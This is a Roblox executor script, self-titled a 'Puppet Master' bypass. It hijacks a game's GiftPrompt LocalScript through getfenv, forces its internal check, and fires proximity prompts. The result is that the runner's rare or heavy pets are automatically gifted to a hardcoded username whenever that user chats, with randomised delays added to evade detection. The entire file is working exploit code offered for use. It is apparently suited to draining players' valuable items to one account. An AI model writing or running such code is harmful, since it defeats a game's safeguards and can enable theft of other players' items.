--[[
    THE DEFINITIVE BYPASS - "PUPPET MASTER" PROTOCOL
    - STRATEGY: Gifter-only. Hijacks the game's own "GiftPrompt" LocalScript to force it to create the prompt for us.
    - CORE: Manually calls the game script's internal functions, then uses `fireproximityprompt` on the result.
    - This is the final, most advanced, and only viable solution.
]]

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer

-- =========================================================================================
-- ### CONFIGURATION ###
local MasterPetList = {"Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"}
local TrashPetList = {"Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken", "Pig", "Crab", "Starfish", "Seagull"}
local TargetUsername = "Proplong1"
local giftingWeightThreshold = 11
-- =========================================================================================

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = character and character:FindFirstChild("Humanoid")
local backpack = LocalPlayer and LocalPlayer:FindFirstChild("Backpack")

local giftingActive = false

-- Helper function, remains the same.
local function isPetInList(petName, list)
    for i = 1, #list do
        local nameInList = list[i]
        if string.sub(petName, 1, #nameInList) == nameInList then
            return true, nameInList
        end
    end
    return false, nil
end

-- The Patient Hunter function, remains the same.
local function waitForPrompt(targetCharacter)
    local time_elapsed = 0
    local timeout = 2.5
    while time_elapsed < timeout do
        for _, prompt in ipairs(game:GetService("ProximityPromptService"):GetPrompts()) do
            if prompt.Adornee and prompt.Adornee:IsDescendantOf(targetCharacter) then
                return prompt
            end
        end
        task.wait(0.1)
        time_elapsed = time_elapsed + 0.1
    end
    return nil
end

-- The new Puppet Master Gifter function.
local function giftSingleBatch_PuppetMaster(targetPlayer)
    if not humanoid or not backpack then giftingActive = false; return end
    print("[Gifter] Puppet Master Protocol: Starting new gift batch...")
    
    local targetCharacter = targetPlayer.Character
    if not targetCharacter or not targetCharacter.Parent then
        print("[Gifter Error] Could not find the target player's character in the game.")
        giftingActive = false
        return
    end

    -- Step 1: Find the brain. The "GiftPrompt" LocalScript on the target player.
    local giftScript = targetCharacter:FindFirstChild("GiftPrompt", true)
    if not giftScript then
        warn("[PUPPET MASTER] CRITICAL ERROR: Could not find the 'GiftPrompt' LocalScript on the target player. Bypass failed.")
        giftingActive = false
        return
    end

    local petsToGiftSnapshot = {}
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local isMaster, _ = isPetInList(item.Name, MasterPetList)
            local isTrash, _ = isPetInList(item.Name, TrashPetList)
            local isHuge = false
            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
            if weightString then
                local weight = tonumber(weightString)
                if weight and weight >= giftingWeightThreshold then isHuge = true end
            end
            if isHuge or (isMaster and not isTrash) then table.insert(petsToGiftSnapshot, item) end
        end
    end

    if #petsToGiftSnapshot == 0 then print("[Gifter] No giftable pets found.")
    else print("[Gifter] Found " .. #petsToGiftSnapshot .. " pets. Executing hijack...") end

    for i = 1, #petsToGiftSnapshot do
        local itemToGift = petsToGiftSnapshot[i]
        if targetPlayer.Parent == nil or itemToGift.Parent ~= backpack then continue end

        -- Step 2: Equip the pet.
        humanoid:EquipTool(itemToGift)
        print("[Gifter] Equipped: " .. itemToGift.Name)
        
        -- Step 3: Hijack the game script's environment.
        local giftScriptEnv = getfenv(giftScript)
        
        -- Step 4: Find and call the function responsible for checking if a pet is equipped.
        -- Based on the bytecode, it's called "HasFruitToolEquipped".
        if giftScriptEnv and type(giftScriptEnv.HasFruitToolEquipped) == "function" then
            print("[PUPPET MASTER] Forcing game script to re-evaluate equipped tool...")
            giftScriptEnv.HasFruitToolEquipped()
        else
            warn("[PUPPET MASTER] Could not find 'HasFruitToolEquipped' function to hijack.")
        end

        -- Step 5: Now that we've forced the script to run its check, hunt for the prompt it created.
        local giftPrompt = waitForPrompt(targetCharacter)
        
        if giftPrompt then
            if fireproximityprompt then
                print("[PUPPET MASTER] Prompt created by game script. Firing with executor toolkit...")
                fireproximityprompt(giftPrompt)
            else
                warn("[PUPPET MASTER] 'fireproximityprompt' not found. This will likely fail.")
                game:GetService("ProximityPromptService"):InputTriggered(giftPrompt)
            end
        else
            warn("[PUPPET MASTER] Game script failed to create a prompt.")
        end
        
        local humanDelay = 0.8 + (math.random(1, 40) / 100)
        task.wait(humanDelay)
    end
    
    giftingActive = false
    print("[Gifter] Puppet Master batch complete. Script is now idle.")
end

-- The trigger remains the same.
local function onPlayerChatted(player, message)
    if player.Name == TargetUsername then
        if not giftingActive then
            giftingActive = true 
            task.spawn(giftSingleBatch_PuppetMaster, player)
        else
            print("[Gifter] A gift batch is already in progress. Please wait.")
        end
    end
end

-- === SCRIPT EXECUTION STARTS HERE ===
print("[System] Puppet Master Protocol Loaded.")
if not fireproximityprompt then
    warn("[System Warning] This executor does not support 'fireproximityprompt'. The bypass may fail.")
end
print("[System] Target set to: " .. TargetUsername)

Players.PlayerAdded:Connect(function(player) player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end)
for _, player in ipairs(Players:GetPlayers()) do player.Chatted:Connect(function(message) onPlayerChatted(player, message) end) end

print("[System] Awaiting chat from '" .. TargetUsername .. "' to begin.")
